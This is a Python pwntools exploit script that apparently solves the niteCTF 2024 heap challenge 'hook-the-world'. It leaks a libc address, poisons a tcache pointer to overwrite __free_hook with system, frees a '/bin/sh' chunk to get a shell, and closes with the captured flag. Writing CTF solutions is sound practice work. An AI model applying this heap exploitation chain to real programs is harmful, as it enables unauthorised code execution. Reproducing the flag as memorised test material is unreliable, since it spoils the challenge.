import argparse
import sys
sys.path.append('/home/coraline/CTF/pwn-dev/scripts/')
from pwn import *
from pwnfast import Pwn

_p = argparse.ArgumentParser()
_p.add_argument('-d', action="store_true")
_p.add_argument('-r', action="store_true")
args = _p.parse_args()

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './chall_patched'
libc = ELF('./libc.so.6')
conn = 'hook-the-world.chals.nitectf2024.live 1337'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn=conn, ssl=True) if args.r else Pwn(PROG, debug=args.d, pie_base=0x555555400000)

def make(idx, size):
    r.sla(b'>', b'1')
    r.sla(b'number:', str(idx).encode())
    r.sla(b'size:', str(size).encode())

def mfree(idx):
    r.sla(b'>', b'2')
    r.sla(b'#:', str(idx).encode())

def mpay(idx, pay):
    r.sla(b'>', b'3')
    r.sla(b'>', str(idx).encode())
    r.sl(pay)

def mwrite(idx):
    r.sla(b'>', b'4')
    r.sla(b'no:', str(idx).encode())

# Leak libc
make(0, 0xd0)
for i in range(1, 10):
    make(i, 0xd0)
for i in range(9):
    mfree(i)

mwrite(7)
libc_leak = u64(r.rb(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ebca0
log.info('Libc base: ' + hex(libc.address))

# Overwrite tcache fd to __free_hook
mpay(6, p64(libc.sym['__free_hook']))

# Get the chunk
make(0, 0xd0)
r.gdb(r.call('main', 'malloc'))
make(0, 0xd0)
mpay(0, p64(libc.sym['system']))

# Create /bin/sh chunk and free it to simulate system('/bin/sh')
make(1, 0x10)
mpay(1, b'/bin/sh\x00')
mfree(1)

r.interactive()
# nite{A_p1RaT35_fr33D0m_aNd_ho0k_kn0W5_n0_BoUnd}